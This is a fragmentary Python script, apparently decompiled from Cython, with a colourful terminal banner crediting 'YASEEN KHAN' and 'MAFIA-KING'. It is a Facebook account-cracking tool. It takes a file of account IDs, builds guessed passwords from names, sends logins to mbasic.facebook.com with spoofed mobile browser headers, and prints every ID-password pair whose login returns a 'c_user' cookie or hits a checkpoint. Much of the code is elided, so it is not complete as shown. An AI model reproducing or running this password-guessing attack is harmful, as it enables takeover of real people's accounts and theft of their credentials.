...
\033[1;35m   \033[1;32mCREATED BY   :  \033[1;32mYASEEN \033[1;36m&& \033[1;32mKHAN

\033[1;35m   \033[1;33mFACEBOK      : \033[1;33m YASEEN KHAN

\033[1;36m   \033[1;35mGITHUB       :  \033[1;35mYASEEN402

\033[1;32m   \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE

\033[1;32m   \033[1;35mTEAM         :  \033[1;35mMAFIA-KING
...
def KRRSS():
	...
	print(f"\n \033[1;37m[\033[1;32m1\033[1;33m] FILE CLONEING ")
	...
	if me in ["1", "01","11","A","a"]:
		...
		file = input(f'\n [\033[1;32m•\033[1;33m] FILE PATH \033[1;32m: ')
		...
		clear();print(f'\n [\033[1;31m1\033[1;32m] Method \033[1;32m1 \n [\033[1;31m2\033[1;37m] Method \033[1;32m2 ')
		...
		try:
			...
			clear();ps_limit = int(input(f'\n [\033[1;32m?\033[1;32m] How Many Passwords Do You Want To Add \033[1;33m: '))

		except:

			ps_limit =1

		clear();print(f'\n [\033[1;32m•\033[1;37m] Example: \033[1;32mfirst last,firtslast,first123 \033[1;37m\n')
...
def m1(ids,names,passlist):
        ...
        sys.stdout.write(f'\r\r\033[1;37m [YASEEN-M1] \033[1;36m|\033[1;37m %s \033[1;36m|\033[1;37m OK \033[1;36m|\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-G977B Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 Maxthon/9900', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        ...
                        if "c_user" in KRRSS:
                                ...
                                if 'y' in krk:
                                        ...
                                        print(f'\r\r\033[1;91m [YASEEN-CP] '+ids+' | '+pas+'\033[1;97m')
...
def m2(ids,names,passlist):
        ...
        sys.stdout.write(f'\r\r\033[1;37m [YASEEN-M2] \033[1;36m|\033[1;37m %s \033[1;36m|\033[1;37m OK \033[1;36m|\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8A Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 Maxthon/9100', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
